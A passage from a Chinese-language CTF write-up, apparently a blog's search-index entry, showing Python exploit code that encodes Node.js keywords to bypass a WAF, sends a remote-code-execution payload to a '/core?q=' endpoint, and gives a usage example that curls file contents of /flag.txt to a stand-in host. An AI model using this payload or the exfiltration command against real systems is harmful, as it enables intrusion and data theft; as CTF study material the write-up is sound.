payload.replace(<span class="string">"!"</span>,<span class="string">"%C4%A1"</span>)</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">"+"</span>,<span class="string">"%2B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">";"</span>,<span class="string">"%3B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"&amp;"</span>,<span class="string">"%26"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Bypass Waf </span></span><br><span class="line">    payload = payload.replace(<span class="string">"global"</span>,<span class="string">"%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"process"</span>,<span class="string">"%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"mainModule"</span>,<span class="string">"%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"require"</span>,<span class="string">"%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"root"</span>,<span class="string">"%C5%B2%C5%AF%C5%AF%C5%B4"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"child_process"</span>,<span class="string">"%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"exec"</span>,<span class="string">"%C5%A5%C5%B8%C5%A5%C5%A3"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(url,cmd)</span>:</span></span><br><span class="line">    payloadC =  payloadRaw.replace(<span class="string">"evalcmd"</span>,cmd)</span><br><span class="line">    urlC = url+<span class="string">"/core?q="</span>+getParm(payloadC)</span><br><span class="line">    requests.get(urlC)</span><br><span class="line">    </span><br><span class="line">    requests.get(url+<span class="string">"/?action=5am3_get_flag"</span>).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    targetUrl = sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">print</span> run(targetUrl,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python exp.py http://127.0.0.1:8081 "curl eval.com -X POST -d `cat /flag.txt`"</span></span><br></pre></td></tr></table></figure>

<p>剩下一道exExpress坐了别的队的车。那道没做出来，以后补上吧。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
</search>
